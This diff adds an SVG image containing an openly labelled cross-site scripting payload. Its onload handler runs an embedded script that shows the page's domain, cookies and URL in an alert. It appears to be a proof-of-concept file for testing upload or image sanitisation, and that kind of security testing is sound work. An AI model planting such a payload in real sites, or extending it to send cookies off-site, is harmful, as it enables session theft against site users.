@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200" onload="exploit()">
+  <script>
+    function exploit() {
+      alert(`SVG XSS SUCCESS!
+Domain: ${document.domain}
+Cookie: ${document.cookie}
+URL: ${location.href}`);
+    }
+  </script>
+  <rect width="300" height="200" fill="#ff4444"/>
+  <text x="50" y="100" font-family="monospace" font-size="16" fill="white">
+    Click me → XSS
+  </text>
+</svg>
